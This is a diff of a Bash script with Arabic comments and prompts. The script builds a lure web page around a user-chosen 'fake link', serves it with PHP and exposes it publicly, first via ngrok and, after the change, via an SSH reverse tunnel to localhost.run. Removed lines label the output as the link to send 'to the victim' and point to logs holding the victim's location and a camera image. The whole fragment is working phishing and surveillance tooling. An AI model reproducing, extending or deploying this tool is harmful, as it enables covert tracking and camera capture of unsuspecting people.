@@ -3,24 +3,21 @@
 echo -n "📌 ادخل الرابط الوهمي اللي تختاره: "
 read CUSTOM_LINK
 
+# تحقق من وجود القالب
 if [ ! -f templates/default.html ]; then
   echo "❗ ملف القالب مش موجود!"
   exit 1
 fi
 
+# تجهيز الصفحة
 cp templates/default.html temp.html
 sed -i "s|{{CUSTOM_LINK}}|$CUSTOM_LINK|g" temp.html
 
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+# تشغيل السيرفر المحلي على 8080
+php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+
 sleep 2
 
-killall ngrok >/dev/null 2>&1
-ngrok http 3333 > /dev/null 2>&1 &
-sleep 5
-
-TUNNEL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')
-echo "[+] الرابط اللي تبعته للضحية:"
-echo "$TUNNEL/temp.html"
-
-echo "📍 بيانات الموقع: logs/location.txt"
-echo "📸 ملف الكاميرا: logs/image.jpg"
+# فتح نفق SSH بـ localhost.run
+echo "🚀 جاري إنشاء رابط عام باستخدام localhost.run..."
+ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 nokey@localhost.run
